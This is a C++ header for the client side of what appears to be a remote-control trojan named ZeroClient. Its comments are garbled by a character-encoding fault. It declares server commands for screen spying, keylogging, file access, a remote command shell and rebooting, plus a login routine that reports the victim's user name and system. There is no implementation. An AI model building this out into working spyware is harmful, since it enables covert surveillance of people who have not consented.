#pragma once
#ifndef ZEROCLIENT_H
#define ZEROCLIENT_H
#pragma execution_character_set("utf-8")
#include "tcpsocket.h"
#include <iostream>
#include <string>
#include <map>

class ZeroClient
{
public:
    ZeroClient();

    HINSTANCE hInst;    // ��Ӧ�ó����ʵ�����

    // �������ͻ��˷��͵�ָ��
    const std::string CmdScreenSpy = "SCREEN_SPY";
    const std::string CmdKeyboardSpy = "KEYBOARD_SPY";
    const std::string CmdFileSpy = "FILE_SPY";
    const std::string CmdCmdSpy = "CMD_SPY";
    const std::string CmdSendMessage = "SEND_MESSAGE";
    const std::string CmdReboot = "REBOOT";
    const std::string CmdQuit = "QUIT";

    // �ͻ��������˷��͵�ָ��
    const std::string CmdLogin = "LOGIN";

    // �ָ���źͽ������ţ������������:LOGIN<�ָ��>SYSTEM<�ָ��>Windows 7<�ָ��>USER_NAME<�ָ��>sumkee911<��������>
    const std::string CmdSplit = ";";
    const std::string CmdEnd = "\r\n";

    // �����������
    void connectTo(std::string domain, int port);

private:
    TcpSocket mSock;    // ���������ӵ�socket
    std::string mBuf;    // ���ݻ�����

    // ��ȡ�����û�����ϵͳ�ͺ�
    std::string getUserName();
    std::string getSystemModel();

    // ��������
    bool sendLogin();

    // ���ݴ�����
    void addDataToBuffer(char* data, int size);
    void processCmd(std::string& cmd, std::string& data);
    //std::map<std::string, std::string> parseArgs(std::string& data);

    // ��Ӧ�ڸ���ָ��Ĵ�����
    void doScreenSpy(std::map<std::string, std::string>& args);
    void doKeyboardSpy(std::map<std::string, std::string>& args);
    void doFileSpy(std::map<std::string, std::string>& args);
    void doCmdSpy(std::map<std::string, std::string>& args);
    void doSendMessage(std::map<std::string, std::string>& args);
    void doReboot(std::map<std::string, std::string>& args);
    void doQuit(std::map<std::string, std::string>& args);
};

#endif // ZEROCLIENT_H